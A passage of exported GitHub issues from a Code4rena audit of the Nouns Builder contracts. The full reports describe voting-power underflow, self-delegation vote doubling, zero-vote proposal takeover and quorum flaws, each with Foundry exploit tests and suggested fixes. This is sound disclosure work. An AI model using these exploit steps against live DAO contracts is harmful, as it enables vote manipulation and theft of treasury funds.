https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L144-L174  ```solidity     function delegateBySig(         address _from,         address _to,         uint256 _deadline,         uint8 _v,         bytes32 _r,         bytes32 _s     ) external {         // Ensure the signature has not expired         if (block.timestamp > _deadline) revert EXPIRED_SIGNATURE();          // Used to store the digest         bytes32 digest;          // Cannot realistically overflow         unchecked {             // Compute the hash of the domain seperator with the typed delegation data             digest = keccak256(                 abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR(), keccak256(abi.encode(DELEGATION_TYPEHASH, _from, _to, nonces[_from]++, _deadline)))             );         }          // Recover the message signer         address recoveredAddress = ecrecover(digest, _v, _r, _s);          // Ensure the recovered signer is the voter         if (recoveredAddress == address(0) || recoveredAddress != _from) revert INVALID_SIGNATURE();          // Update the delegate         _delegate(_from, _to);     } ```  And pass zero address to the _delegate() where it is being set:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190  ```solidity     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  In this case _moveDelegateVotes() will reduce the votes from the owner, not adding it to anywhere as `_from` is the owner, while `_to` is zero address:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L203-L220  ```solidity             if (_from != _to && _amount > 0) {                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 }                  // If this isn't a token burn:                 if (_to != address(0)) { // @ audit here we add the votes to the target, but only if it's not zero address ```  The owner might know that and can use such a delegation to interfere with the system by prohibiting of transferring/burning of his ids.  This happens via _afterTokenTransfer() reverting as it's becomes impossible to reduce owner's votes balance by `1`:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L271  ```solidity     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient         _moveDelegateVotes(_from, _to, 1);          super._afterTokenTransfer(_from, _to, _tokenId);     } ```  ## Recommended Mitigation Steps  Consider prohibiting zero address as a delegation destination:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190  ```solidity     function _delegate(address _from, address _to) internal { +  if (_to == address(0)) revert INVALID_SIGNATURE();          // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  When `_to` isn't zero there always be an addition in _moveDelegateVotes(), so the system votes balance will be sustained.    "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/473", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/472", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Use can get unlimited votes", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/469", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268   # Vulnerability details  ## Impact  `aftertokenTransfer` in ERC721Votes transfers votes between user addresses instead of the delegated addresses, so a user can cause overflow in `_moveDelegates` and get unlimited votes  ## Proof of Concept  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268  ```     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient         _moveDelegateVotes(_from, _to, 1);          super._afterTokenTransfer(_from, _to, _tokenId);     } ``` https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L216  ```     _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     ...     unchecked {                 ...                 // Update their voting weight                 _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);             } ``` During delegation `balanceOf(from)` amount of votes transferred are to the `_to` address  ```     function test_UserCanGetUnlimitedVotes() public {          vm.prank(founder);         auction.unpause();          vm.prank(bidder1);         auction.createBid{ value: 1 ether }(2);          vm.warp(10 minutes + 1 seconds);          auction.settleCurrentAndCreateNewAuction();                  assertEq(token.ownerOf(2), bidder1);          console.log(token.getVotes(bidder1)); // 1         console.log(token.delegates(bidder1)); // 0 bidder1          vm.prank(bidder1);         token.delegate(bidder2);          console.log(token.getVotes(bidder1)); // 1         console.log(token.getVotes(bidder2)); // 1          vm.prank(bidder1);         auction.createBid{value: 1 ether}(3);          vm.warp(22 minutes);          auction.settleCurrentAndCreateNewAuction();          assertEq(token.ownerOf(3), bidder1);          console.log(token.balanceOf(bidder1)); // 2         console.log(token.getVotes(bidder1)); // 2         console.log(token.getVotes(bidder2)); // 1          vm.prank(bidder1);                 token.delegate(bidder1);          console.log(token.getVotes(bidder1)); // 4         console.log(token.getVotes(bidder2)); // 6277101735386680763835789423207666416102355444464034512895        } ```  When user1 delegates to another address `balanceOf(user1)` amount of tokens are subtraced from user2's votes, this will cause underflow and not revert since the statements are unchecked  ## Tools Used  foundry  ## Recommended Mitigation Steps  Change delegate transfer in `afterTokenTransfer` to   ```         _moveDelegateVotes(delegates(_from), delegates(_to), 1); ```  "}, {"title": "Changing treasury owner through `transferOwnership()` can break `Governer.sol` and `Auction.sol`", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/468", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-09-nouns-builder-findings", "body": "Changing treasury owner through `transferOwnership()` can break `Governer.sol` and `Auction.sol`"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/466", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/464", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Minting is not possible when a property has no items", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/459", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-09-nouns-builder-findings", "body": "Minting is not possible when a property has no items"}, {"title": "Tokens without properties can be minted and cannot be rendered", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/455", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-09-nouns-builder-findings", "body": "Tokens without properties can be minted and cannot be rendered"}, {"title": "Auction parameters can be changed during ongoing auction", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/450", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L307-L335   # Vulnerability details  ## Impact  The auction parameters can be changed anytime, even during ongoing auctions, and take effect immediately. Users may need time to react to the changes. The impacts maybe followings: - some sudden changes may cause bidder's transaction fail, such as `setReservePrice()` and `setMinimumBidIncrement()` - some changes may change users expectation about the auction, such as `setDuration()` and `setTimeBuffer()`, with different time parameters, bidders will use different strategy   ## Proof of Concept  src/auction/Auction.sol ```solidity     function setDuration(uint256 _duration) external onlyOwner {         settings.duration = SafeCast.toUint40(_duration);          emit DurationUpdated(_duration);     }      function setReservePrice(uint256 _reservePrice) external onlyOwner {         settings.reservePrice = _reservePrice;          emit ReservePriceUpdated(_reservePrice);     }      function setTimeBuffer(uint256 _timeBuffer) external onlyOwner {         settings.timeBuffer = SafeCast.toUint40(_timeBuffer);          emit TimeBufferUpdated(_timeBuffer);     }      function setMinimumBidIncrement(uint256 _percentage) external onlyOwner {         settings.minBidIncrement = SafeCast.toUint8(_percentage);          emit MinBidIncrementPercentageUpdated(_percentage);     }```   ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  - do not apply changed parameters on ongoing auctions  - add a timelock for the changes  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/447", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/446", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/444", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/438", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/437", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "A proposal can pass with 0 votes in favor at early DAO stages", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/436", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441   # Vulnerability details  It's possible to create a proposal for a DAO as soon as it's deployed and the proposal can pass even if nobody votes.  This possibility of doing so is based on the following assumptions: 1. The vetoer doesn't veto the proposal 2. `proposal.quorumVotes` is 0, which happens when `token.totalSupply() * settings.quorumThresholdBps < 10_000` 3. `proposal.proposalThreshold` is 0, which happens when `token.totalSupply() * settings.proposalThresholdBps < 10_000`  The amount of time necessary to create and execute a proposal of this kind is dictated by `governor.settings.votingDelay + governor.settings.votingDelay + treasury.delay()`, the lower the time the higher the risk.  ## Impact A malicious actor could build an off-chain script that tracks `DAODeployed` events on the `Manager.sol` contract. Every time a new DAO is spawned the script submits a proposal. This attack is based on the fact that such at an early stage nobody might notice and the chances of this happening are made real because every new DAO can be targeted.   A potential proposal created by an attacker might look like this: 1. Call `governor.updateVetoer(attacker)` 1. Call `governor.updateVotingDelay(0)` 2. Call `governor.updateVotingPeriod(0)` 3. Call `treasury.updateGracePeriod(0)` 4. Call `treasury.updateDelay(1 day)`  With this setup the attacker can make a proposal and queue it immediately to then execute it after 1 day time; which gives him the time to veto any proposal that tries to interfere with the attack. At this point the attacker has sudo powers and if there's any bid he can take the funds.  This is just one possible attack path, but the point is making a proposal pass can give an attacker sudo powers and nobody might notice for a while.  ## Proof of Concept Here's a test I wrote that proves the attack path outlined above, you can copy it into `Gov.t.sol` and execute it with `forge test -m test_sneakProposalAttack`:  ```javascript  function test_sneakProposalAttack() public {         address attacker = vm.addr(0x55);          address[] memory targets = new address[](5);         uint256[] memory values = new uint256[](5);         bytes[] memory calldatas = new bytes[](5);          // 1. Call `governor.updateVetoer(attacker)`         targets[0] = address(governor);         values[0] = 0;         calldatas[0] = abi.encodeWithSignature(\"updateVetoer(address)\", attacker);          // 2. Call `governor.updateVotingDelay(0)`         targets[1] = address(governor);         values[1] = 0;         calldatas[1] = abi.encodeWithSignature(\"updateVotingDelay(uint256)\", 0);          //3. Call `governor.updateVotingPeriod(0)`         targets[2] = address(governor);         values[2] = 0;         calldatas[2] = abi.encodeWithSignature(\"updateVotingPeriod(uint256)\", 0);          //3. Call `treasury.updateGracePeriod(0)`         targets[3] = address(treasury);         values[3] = 0;         calldatas[3] = abi.encodeWithSignature(\"updateGracePeriod(uint256)\", 0);          //4. Call `treasury.updateDelay(1 day)`         targets[4] = address(treasury);         values[4] = 0;         calldatas[4] = abi.encodeWithSignature(\"updateDelay(uint256)\", 60 * 60 * 24);          //Attacker creates proposal as soon as contract is deployed         bytes32 proposalId = governor.propose(targets, values, calldatas, \"\");          //Wait for proposal.voteEnd         vm.warp((governor.getProposal(proposalId).voteEnd));          //Queue it         governor.queue(proposalId);          //Wait for treasury delay         vm.warp(block.timestamp + treasury.delay());          //Execute proposal         governor.execute(targets, values, calldatas, keccak256(bytes(\"\")));          //Shows it's now possible for an attacker to queue a proposal immediately         bytes32 proposalId2 = governor.propose(targets, values, calldatas, \"mock\");         governor.queue(proposalId2);          //And executed it after one day         vm.warp(block.timestamp + 60 * 60 * 24);         governor.execute(targets, values, calldatas, keccak256(bytes(\"mock\")));     }  ```  ## Recommended Mitigation Steps This potential attack path comes from a combination of factors, maninly: 1. A proposal can be created directly after deployment 2. The `proposal.proposal.proposalThreshold` and `proposal.quorumVotes` are set to 0 at such early stages 3. A proposal with 0 votes is allowed to pass  I would say that requiring at least 1 vote for a proposal to be considered `Succeeded` is rational and should mitigate this problem because that would require the attacker to bid on auction to get 1 voting power, increasing the cost and the time necessary for the attack.  At [Governor.sol#L441](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441) we have:  ```javscript else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {         return ProposalState.Defeated; } ``` which can be changed to: ```javscript else if (proposal.forVotes == 0 || proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {         return ProposalState.Defeated; } ``` "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/429", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/428", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/424", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "The quorum votes calculations don't take into account burned tokens", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/423", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L475 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L524   # Vulnerability details  Because the following happens:  1. Burned tokens votes are effectively deleted in `token._moveDelegateVotes()` when called by `token.burn()` 2. When an auction gets settled without bidders the function burns the token by calling `token.burn()` 3. When `_createAuction()` is called an amount of tokens >= 1 is minted, of which 1 is kept in the auction contract 4. The functions `governor.proposalThreshold()` and `governor.quorum()` both depend on `token.totalSupply()` for their calculations.  We can derive that the protocol calculates the `quorumVotes` taking into account burned tokens and tokens held in the auction contract, which don't have any actual voting power. In other words the actual `quorumThresholdBps` is equal or higher than the setted `quorumThresholdBps`.  ## Impact The worse case scenario that can happen is that the quorum gets so high that a proposal cannot pass even if everybody voted and everybody voted `for`, potentially locking funds into the contract.  We can define:  1. `assumedVotingPower` = `token.totalSupply()` 2. `realVotingPower` = `token.totalSupply() - amountOfTokensBurned` 3. `\u0394VotingPower` = `amountOfTokensBurned`   This is the case if:  ``` realVotingPower at proposal.voteEnd < quorum at proposal.timeCreated ``` which is the same as  ``` realVotingPower < (assumedVotingPower * settings.quorumThresholdBps) / 10_000 ``` and rearranging in terms of `settings.quorumThresholdBps` we have:  ``` settings.quorumThresholdBps > 10_000 * realVotingPower/assumedVotingPower ```  Knowing that:  1. The possible range of values for `10_000 * realVotingPower/assumedVotingPower` is from `1` to `10000`. If `realVotingPower = 0` this model doesn't make sense in the first place.   2. The possible range of values of `settings.quorumThresholdBps` is from `1` to `2^16 - 1`. The protocol allows for `settings.quorumThresholdBps` to be `0`, in which case it means that the actual quorum is `0`; a context in which this model doesn't make sense. There's another catch that restricts this boundaries, if `settings.quorumThresholdBps * token.totalSupply()` < `10_000` the output of `governance.quorum()` would be `0`.   Many combinations of values in the ranges described above render this disequation true, note, however, that this describes the workings in a mathematical settings and it doesnt hold true for every case in a real setting because of roundings and approximations.  We can intuitevely notice that when `realVotingPower/assumedVotingPower` is very low, which is the case of a DAO with few tokens burned, the chances of the disequation being true are slim and when it's high the chances of the disequation being true become higher. The opposite is true for `settings.quorumThresholdBps`.  This might lock funds in DAOs with a lot of unsold auctions who have a low `settings.quorumThresholdBps`.  At early stages this is mitigated by the fact that for every possible token burned some tokens are minted to the founders, but when the vest expires this mitigation is not in place anymore.  ## Proof of concept  I wrote a test that's expected to revert a `proposal.queue()` even if all possible votes available are cast in favor.  The test comes with two parameters to set: `auctionsToRun` and `tokensToBidder`. The test runs `auctionsToRun` auctions, of which the first `tokensToBidder` are bidded upon and the rest are not. Then: 1. Creates a proposal 2. Cast all possible votes in favor 3. Tries to queue a proposal 4. Reverts  The default parameters are set to `auctionsToRun = 130` and `tokensToBidder = 10`. Also `quorumThresholdBps = 1000`. This test results in `121 tokens burned` and `133 token minted`. It's quite an unrealistic scenario, but it can get more real if `quorumThresholdBps` is setted lower. Keep in mind that this is the case in which everybody shows up to vote and averybody votes for.  ### Test code The test can be pasted inside `Gov.t.sol` and then run with:  `test -m test_RevertQueueProposalWithEverybodyInFavour`  ```javascript function test_RevertQueueProposalWithEverybodyInFavour() public {     //Number of auctions to run     uint256 auctionsToRun = 130;      //Amount of tokens to bid up     uint256 tokensToBidder = 10;      address bidder1 = vm.addr(0xB1);     vm.deal(founder, 10000 ether);     vm.deal(bidder1, 10000 ether);      //Start the first auction     vm.prank(founder);     auction.unpause();      //Simulates an `auctionsToRun` amount of auctions in which the first `tokensForBidder` tokens     //are minted and then every auction ends with no bidders.     uint256 amountOfBurnedTokens;     for (uint256 i = 1; i < auctionsToRun + 1; ++i) {         if (i < tokensToBidder) {             uint256 id = token.totalSupply() - 1;             vm.prank(bidder1);             auction.createBid{ value: 0.15 ether }(id);         } else {             amountOfBurnedTokens++;         }          vm.warp(block.timestamp + auction.duration() + 1);         auction.settleCurrentAndCreateNewAuction();     }      uint256 founderVotes = token.getVotes(founder);     uint256 founder2Votes = token.getVotes(founder2);     uint256 bidder1Votes = token.getVotes(bidder1);     uint256 auctionVotes = token.getVotes(address(auction));      uint256 realVotingPower = founderVotes + founder2Votes + bidder1Votes;     uint256 assumedVotingPower = token.totalSupply();      assertEq(realVotingPower, assumedVotingPower - amountOfBurnedTokens - auctionVotes);      //Create mock proposal     (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = mockProposal();     vm.prank(bidder1);     bytes32 proposalId = governor.propose(targets, values, calldatas, \"\");      emit log_string(\"Amount of tokens minted: \");     emit log_uint(token.totalSupply());      emit log_string(\"Amount of tokens burned:\");     emit log_uint(amountOfBurnedTokens);      emit log_string(\"---------\");      emit log_string(\"The real quorumThresholdBps is: \");     uint256 realquorumThresholdBps = (governor.getProposal(proposalId).quorumVotes * 10_000) / realVotingPower;     emit log_uint(realquorumThresholdBps);      emit log_string(\"The assumed quorumThresholdBps is:\");     uint256 assumedquorumThresholdBps = (governor.getProposal(proposalId).quorumVotes * 10_000) / token.totalSupply();     emit log_uint(assumedquorumThresholdBps);      emit log_string(\"---------\");      vm.warp(governor.getProposal(proposalId).voteStart);      //Everybody cast a `for` vote     vm.prank(founder);     governor.castVote(proposalId, 1);      vm.prank(founder2);     governor.castVote(proposalId, 1);      vm.prank(bidder1);     governor.castVote(proposalId, 1);      emit log_string(\"The amount of votes necessary for this proposal to pass is:\");     emit log_uint(governor.getProposal(proposalId).quorumVotes);      emit log_string(\"The amount of for votes in the proposal:\");     emit log_uint(governor.getProposal(proposalId).forVotes);      //Proposal still doesn't pass     vm.warp((governor.getProposal(proposalId).voteEnd));     vm.expectRevert(abi.encodeWithSignature(\"PROPOSAL_UNSUCCESSFUL()\"));     governor.queue(proposalId); } ```  ## Tools Used Forge  ## Recommended Mitigation Steps Either one of this 2 options is viable: 1. Decrease `token.totalSupply()` whenever a token gets burned. This might not be expected behaviour from the point of view of external protocols. 2. Adjust the calculations in `proposal.quorum()` and `governor.proposalThreshold()` in such a way that they take into account the burned tokens and the tokens currently held by the auction contract."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/418", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-09-nouns-builder-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/415", "labels": ["bug", "G (Gas Optimization)", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "Gas Optimizations"}, {"title": "`ERC721Votes`: Token owners can double voting power through self delegation", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L176-L190 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L192-L235   # Vulnerability details  The owner of one or many `ERC721Votes` tokens can double their voting power once (and only once) by delegating to their own address as their first delegation.  ### Scenario This exploit relies on the initial default value of the `delegation` mapping in `ERC721Votes`, which is why it will only work once per address.  First, the token owner must call `delegate` or `delegateBySig`, passing their own address as the delegate:  [`ERC721Votes#delegate`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135)  ```solidity     /// @notice Delegates votes to an account     /// @param _to The address delegating votes to     function delegate(address _to) external {         _delegate(msg.sender, _to);     } ```  This calls into the internal `_delegate` function, with `_from` and `_to` both set to the token owner's address:  [`ERC721Votes#_delegate`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L176-L190)  ```solidity     /// @dev Updates delegate addresses     /// @param _from The address delegating votes from     /// @param _to The address delegating votes to     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  Since this is the token owner's first delegation, the `delegation` mapping does not contain a value for the `_from` address, and `prevDelegate` on L#181 will be set to `address(0)`:  [`ERC721Votes.sol#L180-L181`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L180-L181)  ```solidity         // Get the previous delegate         address prevDelegate = delegation[_from]; ```  This function then calls into `_moveDelegateVotes` to transfer voting power. This time, `_from` is `prevDelegate`, equal to `address(0)`; `_to` is the token owner's address; and `_amount` is `balanceOf(_from)`, the token owner's current balance:  [`ERC721Votes#_moveDelegateVotes`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L192-L235)  ```solidity  /// @dev Transfers voting weight     /// @param _from The address delegating votes from     /// @param _to The address delegating votes to     /// @param _amount The number of votes delegating     function _moveDelegateVotes(         address _from,         address _to,         uint256 _amount     ) internal {         unchecked {             // If voting weight is being transferred:             if (_from != _to && _amount > 0) {                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 }                  // If this isn't a token burn:                 if (_to != address(0)) {                     // Get the recipients's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_to]++;                      // Used to store the recipient's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the recipient's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);                 }             }         }     } ```  The `if` condition on L#203 is `true`, since `_from` is `address(0)`, `_to` is the owner address, and `_amount` is nonzero:  [`ERC721Votes.sol#L202-L203`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L202-L203)  ```solidity             // If voting weight is being transferred:             if (_from != _to && _amount > 0) { ```  Execution skips the `if` block on L#205-217, since `_from` is `address(0)`:  [`ERC721Votes.sol#L205-L217`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L204-L217)  ```solidity                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 } ```  However, the `if` block on L#220-232 will execute and increase the voting power allocated to `_to`:  [`ERC721Votes.sol#L220-L232`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L219-L232)  ```solidity                 // If this isn't a token burn:                 if (_to != address(0)) {                     // Get the recipients's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_to]++;                      // Used to store the recipient's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the recipient's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);                 } ```  The token owner's voting power has now been increased by an amount equal to their total number of tokens, without an offsetting decrease.  This exploit only works once: if a token owner subsequently delegates to themselves after their initial self delegation, `prevDelegate` will be set to a non-default value in `_delegate`, and the delegation logic will work as intended.  ### Impact Malicious `ERC21Votes` owners can accrue more voting power than they deserve. Especially malicious owners may quietly acquire multiple tokens before doubling their voting power. In an early DAO with a small supply of tokens, the impact of this exploit could be significant.  ### Recommendation Make the `delegates` function `public` rather than `external`:  ```solidity     /// @notice The delegate for an account     /// @param _account The account address     function delegates(address _account) public view returns (address) {         address current = delegation[_account];         return current == address(0) ? _account : current;     } ```  Then, call this function rather than accessing the `delegation` mapping directly:  ```solidity     /// @dev Updates delegate addresses     /// @param _from The address delegating votes from     /// @param _to The address delegating votes to     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegates(_from);          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  Note that the original NounsDAO contracts follow this pattern. (See [here](https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91) and [here](https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91)).   ### Test cases (Put the following test cases in `Gov.t.sol`)  ```solidity     function test_delegate_to_self_doubles_voting_power() public {         mintVoter1();          assertEq(token.getVotes(address(voter1)), 1);          vm.startPrank(voter1);         token.delegate(address(voter1));          assertEq(token.getVotes(address(voter1)), 2);     }      function mintToken(uint256 tokenId) internal {         vm.prank(voter1);         auction.createBid{ value: 0.420 ether }(tokenId);          vm.warp(block.timestamp + auctionParams.duration + 1 seconds);         